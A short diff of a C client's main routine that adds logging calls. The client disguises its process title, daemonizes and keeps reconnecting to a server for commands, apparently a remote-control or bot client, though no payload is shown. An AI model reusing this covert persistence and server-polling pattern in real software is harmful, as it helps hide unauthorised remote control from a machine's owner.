@@ -10,7 +10,7 @@
 #include "alg/alexjlz_hash.h"
 #include "daemon/daemon.h"
 #include "log/log.h"
-#include "common.h"
+#include "config.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -27,25 +27,31 @@ extern uint32_t numpids;
 
 int main(int argc, char **argv)
 {
+    alexjlz_log(1, "client started:%s\n", uuid);
     generate_uuid();
+    alexjlz_log(1, "uuid generated:%s\n", uuid);
     getOurIP();
 	srand(time(NULL) ^ getpid());
 	init_rand(time(NULL) ^ getpid());
     set_proc_title(argc, argv, PROC_TITLE);
-	//printf("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", macAddress[0], macAddress[1], macAddress[2], macAddress[3], macAddress[4], macAddress[5]);
+    alexjlz_log(1, "set proc title success\n");
 
     while (1)
     {
         if ( daemonize() == 0 )
             break;
+        alexjlz_log(3, "daemonize failed\n");
         sleep(3);
     }
+    alexjlz_log(3, "daemonize success\n");
     while ( 1 )
     {
 		if( (mainCommSock=connect_tcp_server(server, port)) == -1)
         { 
+            alexjlz_log(3, "connect to server failed\n");
             sleep(5); continue; 
         }
+        alexjlz_log(3, "connect to server success\n");
         if ( ask_for_service( mainCommSock ) == -1 )  // return from this function means connection between client
                                                       // and server are unexpectedly closed
         {
